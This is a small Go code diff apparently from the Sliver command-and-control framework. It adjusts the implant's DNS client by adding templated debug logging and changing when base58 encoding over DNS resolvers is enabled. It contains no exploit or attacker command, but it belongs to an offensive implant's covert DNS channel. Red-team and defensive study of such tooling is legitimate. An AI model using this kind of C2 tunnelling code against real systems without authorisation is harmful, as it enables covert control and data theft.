@@ -176,6 +176,10 @@ func (w *DNSWorker) Start(id int, queue <-chan *DNSWork) {
 		for work := range queue {
 			var data []byte
 			var err error
+
+			// {{if .Config.Debug}}
+			log.Printf("[dns] #%d work: %v", id, work)
+			// {{end}}
 			switch work.QueryType {
 			case dns.TypeA:
 				data, _, err = w.resolver.A(work.Domain)
@@ -660,6 +664,7 @@ func (s *SliverDNSClient) fingerprintResolvers() {
 	// NOTE: In the future we may want to add a configurable error threshold for now
 	// if we encounter any errors we don't use the resolver.
 	workingResolvers := []DNSResolver{}
+	allSupportBase58 := true
 	for _, resolver := range s.resolvers {
 		meta := s.metadata[resolver.Address()]
 		if 0 < meta.Errors {
@@ -669,9 +674,12 @@ func (s *SliverDNSClient) fingerprintResolvers() {
 			continue
 		}
 		if !meta.EnableBase58 {
-			s.enableBase58 = false
+			allSupportBase58 = false
 		}
 		workingResolvers = append(workingResolvers, resolver)
+	}
+	if allSupportBase58 && !s.forceBase32 {
+		s.enableBase58 = true
 	}
 	s.resolvers = workingResolvers
 }
